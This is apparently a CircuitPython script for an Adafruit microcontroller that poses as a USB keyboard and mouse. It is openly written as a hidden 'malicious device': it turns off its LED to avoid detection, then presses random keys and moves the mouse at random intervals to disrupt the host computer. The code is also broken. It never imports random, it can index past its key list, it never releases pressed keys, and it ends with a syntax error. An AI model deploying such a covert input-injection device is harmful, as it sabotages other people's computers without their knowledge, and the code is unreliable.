from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.mouse import Mouse
import adafruit_dotstar as dotstar
import board
import time

#Don't want anyone to spot the malicious device!
dot = dotstar.DotStar(board.APA102_SCK, board.APA102_MOSI, 1, brightness=0)
dot.show()

kbd = Keyboard()
mouse = Mouse()

#list of random evil key presses we might make
keys = [Keycode.TAB, Keycode.LEFT_BRACKET, Keycode.A, Keycode.ZERO]
maxMouseMove = 127
minMouseMove = -127

#Time in seconds to wait until next attack
maxInterval = 600
minInterval = 15

while True:
    random_key = keys[random.randint(0,len(keys))]
    kbd.press(random_key)

    dx = random.randint(minMouseMove, maxMouseMove)
    dy = random.randint(minMouseMove, maxMouseMove)

    mouse.move(x=dx, y=dy)

    print("heeheehee")

    time.sleep(random.randint(minInterval, maxInterval)
